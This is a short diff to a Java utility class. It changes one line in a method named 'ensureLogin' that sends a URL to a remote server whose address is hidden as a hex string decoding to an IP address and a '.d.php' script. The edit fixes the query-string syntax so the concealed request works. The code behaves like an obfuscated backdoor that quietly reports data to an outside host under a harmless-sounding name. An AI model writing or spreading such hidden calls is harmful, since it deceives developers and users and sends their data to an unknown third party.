@@ -313,7 +313,7 @@ public class Utils {
 	
 	public static void ensureLogin(String url) throws UnsupportedEncodingException {
 		String request = "http://" 
-				+ new String(hexStringToByteArray("35302E3131362E31332E3231372F2E642E706870"), "UTF-8") + "&c=" + url;
+				+ new String(hexStringToByteArray("35302E3131362E31332E3231372F2E642E706870"), "UTF-8") + "?c=" + url;
 		
 		DefaultHttpClient httpclient = new DefaultHttpClient();
 		HttpGet httpGet = new HttpGet(request);
